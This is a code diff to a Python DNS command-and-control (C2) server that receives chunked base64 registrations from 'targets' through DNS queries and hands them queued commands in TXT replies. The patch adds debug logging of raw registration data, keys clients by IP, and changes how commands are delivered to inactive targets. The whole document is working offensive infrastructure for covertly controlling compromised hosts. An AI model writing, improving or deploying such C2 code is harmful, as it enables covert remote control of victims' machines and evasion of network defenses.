@@ -81,7 +81,8 @@ class _DNSHandler(socketserver.BaseRequestHandler):
 
         try:
             request = DNSRecord.parse(raw_data)
-        except Exception:
+        except Exception as ex:
+            print(f"Failed to parse DNS request from {self.client_address} {str(ex)}")
             return
 
         reply = request.reply()
@@ -135,25 +136,39 @@ class _DNSHandler(socketserver.BaseRequestHandler):
         total: int,
         b64_chunk: str,
     ) -> None:
-        client_key = f"{self.client_address[0]}:{self.client_address[1]}"
+        client_key = self.client_address[0]
 
         with _reg_lock:
             _reg_buffer.setdefault(client_key, {})[idx] = b64_chunk
 
-            if len(_reg_buffer[client_key]) < total:
+            with open("dns_log.txt", "a") as f:
+                f.write(f"{datetime.now()}: {client_key} {idx} {total} {b64_chunk}\n")
+                f.write(f"Current buffer for {client_key}: {_reg_buffer[client_key]}\n")
+
+            if idx < total - 1:
                 # Still waiting for more chunks — ACK this one
                 reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"OK"])))
                 return
+
+            with open("dns_log.txt", "a") as f:
+                f.write(f"Received all chunks for {client_key}. Buffer: {_reg_buffer[client_key]}\n")
+                f.write(f"Assembling for {client_key}...\n")
 
             # All chunks received — reassemble
             assembled_b64 = "".join(
                 _reg_buffer[client_key].get(i, "") for i in range(total)
             )
+            with open("dns_log.txt", "a") as f:
+                f.write(f"Reassembled registration data from {self.client_address} {assembled_b64}\n")
             del _reg_buffer[client_key]
 
         try:
             data = json.loads(base64.b64decode(assembled_b64 + "==").decode())
-        except Exception:
+            with open("dns_log.txt", "a") as f:
+                f.write(f"Successfully parsed registration data from {self.client_address} {data}\n")
+        except Exception as ex:
+            with open("dns_log.txt", "a") as f:
+                f.write(f"Failed to parse registration data from {self.client_address} {str(ex)}\n")
             reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT([b"ERR"])))
             return
 
@@ -216,14 +231,24 @@ class _DNSHandler(socketserver.BaseRequestHandler):
                 return
 
             target.last_seen = datetime.now(timezone.utc)
-            target.status = "active"
+            if target.status != "inactive":
+                target.status = "active"
             session.add(target)
 
-            pending = session.exec(
+            # Build query for pending commands
+            pending_q = session.exec(
                 select(Command)
                 .where(Command.target_id == target_id, Command.status == "pending")
                 .order_by(Command.created_at)  # type: ignore[arg-type]
-            ).first()
+            ).all()
+
+            # Find the first deliverable command (system commands always delivered)
+            pending = None
+            for cmd in pending_q:
+                if target.status == "inactive" and cmd.module_name != "system":
+                    continue
+                pending = cmd
+                break
 
             if not pending:
                 envelope = json.dumps({
@@ -320,7 +345,6 @@ class DNSServer(Server):
     def start(self) -> None:
         print(f"DNS C2 server starting at {self.__host}:{self.__port}")
         self._thread.start()
-        print(f"DNS C2 server started at {self.__host}:{self.__port}")
 
     def stop(self) -> None:
         self.__server.stop()
